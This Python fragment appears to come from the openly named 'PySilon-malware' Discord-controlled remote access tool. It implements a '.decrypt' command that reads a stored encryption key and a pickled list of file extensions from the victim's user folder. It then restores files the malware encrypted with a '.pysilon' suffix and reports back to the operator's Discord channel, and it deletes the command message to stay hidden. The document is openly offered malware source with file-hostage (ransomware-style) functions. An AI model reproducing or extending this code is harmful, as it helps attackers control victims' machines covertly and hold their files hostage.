from cryptography.fernet import Fernet
import os
import pickle
# end of imports

# on message
elif message.content[:8] == '.decrypt':
    #.log Message is "decrypt"
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.decrypt':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        folder_path = message.content[9:]

        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', "rb") as key_file:
            key = key_file.read()

        cipher_suite = Fernet(key)

        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', "rb") as ext_file:
            original_file_extensions = pickle.load(ext_file)

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                
                if file_path.endswith('.pysilon'):
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    decrypted_data = cipher_suite.decrypt(encrypted_data)
                    
                    original_extension = original_file_extensions.pop(0)
                    new_file_name = os.path.splitext(file_path)[0] + original_extension
                    
                    with open(new_file_name, 'wb') as f:
                        f.write(decrypted_data)

                    os.remove(file_path)

        embed = discord.Embed(title="🟢 Success",description=f'```Successfully decrypted the path!```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')